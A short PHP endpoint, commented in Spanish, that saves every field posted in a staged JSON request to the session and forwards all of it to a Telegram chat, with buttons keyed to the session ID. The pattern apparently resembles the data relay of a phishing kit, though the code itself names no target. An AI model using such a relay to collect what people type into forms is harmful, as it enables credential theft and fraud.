<?php

/**
 * Send to Telegram - Endpoint para enviar datos a Telegram
 */

['container' => $container] = require_once __DIR__ . '/../src/bootstrap.php';

$sessionService = $container->get('session');
$telegramService = $container->get('telegram');
$sessionService->start();

$input = file_get_contents('php://input');
$requestData = json_decode($input, true) ?? [];

$stage = $requestData['stage'] ?? '';
$data = $requestData['data'] ?? [];

// Guardar datos en sesión
foreach ($data as $key => $value) {
    $sessionService->set($key, $value);
}

// Enviar a Telegram
$message = $telegramService->formatSessionData($sessionService->all());
$buttons = $telegramService->generateStandardButtons($sessionService->getId());
$telegramService->sendMessage($message, $buttons);

header('Content-Type: application/json');
echo json_encode(['success' => true]);
